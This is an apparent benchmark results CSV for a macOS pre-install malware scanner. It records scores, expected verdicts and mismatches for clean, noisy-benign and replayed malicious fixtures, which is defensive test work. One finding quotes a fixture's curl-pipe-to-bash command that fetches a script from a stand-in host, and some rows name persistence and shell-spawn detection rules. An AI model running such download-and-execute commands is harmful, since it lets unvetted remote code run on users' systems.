run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-08T10-46-09Z-23e5dc","clean_app_manifest_01","clean","app","manifest_fixture","clean/app/clean_app_manifest_01.json","unknown","0","clean","clean","0","10","true","true","","completed","","26","2026-03-08T10:46:09.054Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_notification_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_notification_01.applescript","appleScript","0","clean","clean","0","12","true","true","","completed","","16","2026-03-08T10:46:09.071Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_open_finder_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_open_finder_01.applescript","appleScript","1","clean","clean","0","8","true","true","","completed","","16","2026-03-08T10:46:09.087Z","true","","该样本规则 applescript.finder_control 命中，按上下文归一化后计入风险。。综合评分 1/100，判定 Clean（低风险）。","1","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L2-2 Δ8: tell application ""Finder"""
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_prompt_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_prompt_01.applescript","appleScript","0","clean","clean","0","6","true","true","","completed","","15","2026-03-08T10:46:09.103Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_textedit_newdoc_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_textedit_newdoc_01.applescript","appleScript","0","clean","clean","0","8","true","true","","completed","","15","2026-03-08T10:46:09.119Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_js_base64_demo_01","clean","js","file_fixture","clean/js/clean_js_base64_demo_01.js","javaScript","4","clean","clean","3","15","true","true","","completed","","15","2026-03-08T10:46:09.134Z","true","","该样本规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。。综合评分 4/100，判定 Clean（低风险）。","4","检测到混淆或编码逃逸 | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(source, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');"
"2026-03-08T10-46-09Z-23e5dc","clean_js_child_process_echo_01","clean","js","file_fixture","clean/js/clean_js_child_process_echo_01.js","javaScript","22","clean","clean","5","18","true","false","score_too_high","completed","","14","2026-03-08T10:46:09.148Z","true","","该样本规则 javascript.child_process 命中，按上下文归一化后计入风险。；规则 javascript.child_process 命中，按上下文归一化后计入风险。。综合评分 22/100，判定 Clean（低风险）。","22","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | [javascript.child_process] Node child_process 执行链 [high] L12-12 Δ22: console.log('[clean] child_process output:', stdout.trim()); | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","clean_js_config_merge_01","clean","js","file_fixture","clean/js/clean_js_config_merge_01.js","javaScript","0","clean","clean","0","12","true","true","","completed","","14","2026-03-08T10:46:09.163Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_js_read_local_config_02","clean","js","file_fixture","clean/js/clean_js_read_local_config_02.js","javaScript","0","clean","clean","0","8","true","true","","completed","","13","2026-03-08T10:46:09.176Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_pkg_receipt_stub_01","clean","pkg","descriptor_fixture","clean/pkg/clean_pkg_receipt_stub_01.json","unknown","0","clean","clean","0","10","true","true","","completed","","18","2026-03-08T10:46:09.195Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-08T10-46-09Z-23e5dc","clean_plist_launchagent_template_01","clean","plist","file_fixture","clean/plist/clean_plist_launchagent_template_01.plist","plist","0","clean","clean","0","18","true","true","","completed","","20","2026-03-08T10:46:09.215Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","No dedicated analyzer for plist. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for plist. Fallback to generic analyzer."
"2026-03-08T10-46-09Z-23e5dc","clean_python_config_rw_02","clean","python","file_fixture","clean/python/clean_python_config_rw_02.py","pythonScript","0","clean","clean","0","12","true","true","","completed","","14","2026-03-08T10:46:09.230Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_python_directory_scan_01","clean","python","file_fixture","clean/python/clean_python_directory_scan_01.py","pythonScript","0","clean","clean","0","10","true","true","","completed","","14","2026-03-08T10:46:09.244Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_python_log_rotate_01","clean","python","file_fixture","clean/python/clean_python_log_rotate_01.py","pythonScript","0","clean","clean","0","15","true","true","","completed","","13","2026-03-08T10:46:09.258Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_python_subprocess_safe_01","clean","python","file_fixture","clean/python/clean_python_subprocess_safe_01.py","pythonScript","10","clean","clean","5","18","true","true","","completed","","14","2026-03-08T10:46:09.273Z","true","","该样本规则 python.subprocess_exec 命中，按上下文归一化后计入风险。。综合评分 10/100，判定 Clean（低风险）。","10","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(cmd, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","clean_python_text_summary_01","clean","python","file_fixture","clean/python/clean_python_text_summary_01.py","pythonScript","0","clean","clean","0","8","true","true","","completed","","14","2026-03-08T10:46:09.287Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_shell_backup_01","clean","shell","file_fixture","clean/shell/clean_shell_backup_01.sh","shellScript","0","clean","clean","0","15","true","true","","completed","","14","2026-03-08T10:46:09.301Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_shell_backup_02","clean","shell","file_fixture","clean/shell/clean_shell_backup_02.sh","shellScript","0","clean","clean","0","12","true","true","","completed","","14","2026-03-08T10:46:09.316Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_shell_log_archive_01","clean","shell","file_fixture","clean/shell/clean_shell_log_archive_01.sh","shellScript","0","clean","clean","0","12","true","true","","completed","","14","2026-03-08T10:46:09.330Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_shell_open_safe_site_01","clean","shell","file_fixture","clean/shell/clean_shell_open_safe_site_01.sh","shellScript","0","clean","clean","0","8","true","true","","completed","","13","2026-03-08T10:46:09.344Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_shell_write_test_plist_01","clean","shell","file_fixture","clean/shell/clean_shell_write_test_plist_01.sh","shellScript","0","clean","clean","0","14","true","true","","completed","","14","2026-03-08T10:46:09.358Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_app_bundle_fixture_01","noisy_benign","app","app_bundle_fixture","noisy_benign/app/NoisyUtilityFixture_01.app","appBundle","10","clean","benign_noisy","12","30","true","false","score_too_low","completed","","98","2026-03-08T10:46:09.456Z","true","","该样本样本可执行但未签名，来源可信度不足。。综合评分 10/100，判定 Clean（低风险）。","10","未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-08T10-46-09Z-23e5dc","noisy_app_updater_manifest_01","noisy_benign","app","manifest_fixture","noisy_benign/app/noisy_app_updater_manifest_01.json","unknown","0","clean","benign_noisy","18","38","true","false","score_too_low","completed","","17","2026-03-08T10:46:09.474Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-08T10-46-09Z-23e5dc","noisy_applescript_admin_prompt_sim_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_admin_prompt_sim_01.applescript","appleScript","0","clean","benign_noisy","18","40","true","false","score_too_low","completed","","15","2026-03-08T10:46:09.489Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_applescript_finder_batch_rename_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_finder_batch_rename_01.applescript","appleScript","1","clean","benign_noisy","10","28","true","false","score_too_low","completed","","16","2026-03-08T10:46:09.505Z","true","","该样本规则 applescript.finder_control 命中，按上下文归一化后计入风险。。综合评分 1/100，判定 Clean（低风险）。","1","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L3-3 Δ8: tell application ""Finder"""
"2026-03-08T10-46-09Z-23e5dc","noisy_applescript_terminal_echo_pwd_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_terminal_echo_pwd_01.applescript","appleScript","2","clean","benign_noisy","12","30","true","false","score_too_low","completed","","16","2026-03-08T10:46:09.522Z","true","","该样本规则 applescript.terminal_control 命中，按上下文归一化后计入风险。。综合评分 2/100，判定 Clean（低风险）。","2","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-08T10-46-09Z-23e5dc","noisy_js_child_process_ls_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_child_process_ls_01.js","javaScript","11","clean","benign_noisy","12","30","true","false","score_too_low","completed","","14","2026-03-08T10:46:09.536Z","true","","该样本规则 javascript.child_process 命中，按上下文归一化后计入风险。。综合评分 11/100，判定 Clean（低风险）。","11","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","noisy_js_eval_math_only_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_eval_math_only_01.js","javaScript","15","clean","benign_noisy","15","35","true","true","","completed","","14","2026-03-08T10:46:09.551Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。。综合评分 15/100，判定 Clean（低风险）。","15","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L3-3 Δ22: const result = eval(expression); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","noisy_js_network_cache_text_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_network_cache_text_01.js","javaScript","0","clean","benign_noisy","14","32","true","false","score_too_low","completed","","14","2026-03-08T10:46:09.566Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_js_postinstall_sim_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_postinstall_sim_01.js","javaScript","0","clean","benign_noisy","20","42","true","false","score_too_low","completed","","14","2026-03-08T10:46:09.580Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_pkg_fixture_02","noisy_benign","pkg","pkg_directory_fixture","noisy_benign/pkg/noisy_pkg_fixture_02","pkg","0","clean","benign_noisy","15","35","true","false","score_too_low","completed","","24","2026-03-08T10:46:09.604Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","安装包包含 pre/post install 脚本 | 安装后可能修改路径：./benchmark/sandbox_output/pkg_install_target, /payload"
"2026-03-08T10-46-09Z-23e5dc","noisy_pkg_preinstall_sim_01","noisy_benign","pkg","file_fixture","noisy_benign/pkg/noisy_pkg_preinstall_sim_01.sh","shellScript","0","clean","benign_noisy","22","48","true","false","score_too_low","completed","","13","2026-03-08T10:46:09.618Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_python_build_subprocess_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_build_subprocess_01.py","pythonScript","10","clean","benign_noisy","12","28","true","false","score_too_low","completed","","14","2026-03-08T10:46:09.632Z","true","","该样本规则 python.subprocess_exec 命中，按上下文归一化后计入风险。。综合评分 10/100，判定 Clean（低风险）。","10","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(step, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","noisy_python_dynamic_loader_sim_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_dynamic_loader_sim_01.py","pythonScript","0","clean","benign_noisy","16","35","true","false","score_too_low","completed","","13","2026-03-08T10:46:09.645Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_python_remote_text_api_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_remote_text_api_01.py","pythonScript","0","clean","benign_noisy","14","32","true","false","score_too_low","completed","","14","2026-03-08T10:46:09.659Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_python_tempfile_cleanup_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_tempfile_cleanup_01.py","pythonScript","0","clean","benign_noisy","10","24","true","false","score_too_low","completed","","13","2026-03-08T10:46:09.673Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_python_updater_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_updater_01.py","pythonScript","0","clean","benign_noisy","20","45","true","false","score_too_low","completed","","14","2026-03-08T10:46:09.688Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_shell_appsupport_style_write_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_appsupport_style_write_01.sh","shellScript","0","clean","benign_noisy","10","24","true","false","score_too_low","completed","","15","2026-03-08T10:46:09.703Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_shell_base64_config_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_base64_config_01.sh","shellScript","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","","13","2026-03-08T10:46:09.717Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_shell_chmod_tool_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_chmod_tool_01.sh","shellScript","0","clean","benign_noisy","10","26","true","false","score_too_low","completed","","13","2026-03-08T10:46:09.731Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","noisy_shell_installer_like_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_installer_like_01.sh","shellScript","35","suspicious","benign_noisy","20","45","false","true","verdict_too_high","completed","","14","2026-03-08T10:46:09.746Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。。综合评分 35/100，判定 Suspicious（可疑）。","35","检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L8-8 Δ35: DANGEROUS_LOOKING_CMD='curl -fsSL https://example.invalid/installer.sh | bash' | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","noisy_shell_update_checker_02","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_update_checker_02.sh","shellScript","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","","14","2026-03-08T10:46:09.761Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","replay_clean_app_lifecycle_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_app_lifecycle_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","2","2026-03-08T10:46:09.763Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-08T10-46-09Z-23e5dc","replay_clean_backup_flow_01","replay_clean","replay_json","replay_json","replay/clean/replay_clean_backup_flow_01.json","jsonReplay","0","unknown","clean","0","15","false","true","verdict_too_low","completed","","1","2026-03-08T10:46:09.765Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-08T10-46-09Z-23e5dc","replay_clean_js_fetch_cache_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_js_fetch_cache_02.json","jsonReplay","10","clean","","","","","","expectation_missing","completed","","1","2026-03-08T10:46:09.766Z","true","","Replay evaluation: clean (score 10)","10","[network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-08T10-46-09Z-23e5dc","replay_clean_pkg_appsupport_install_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_pkg_appsupport_install_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","2","2026-03-08T10:46:09.769Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-08T10-46-09Z-23e5dc","replay_clean_python_scan_report_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_python_scan_report_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","1","2026-03-08T10:46:09.771Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-08T10-46-09Z-23e5dc","replay_malicious_app_bash_curl_persist_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_app_bash_curl_persist_02.json","jsonReplay","75","malicious","","","","","","expectation_missing","completed","","3","2026-03-08T10:46:09.774Z","true","","Replay evaluation: malicious (score 75)","75","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
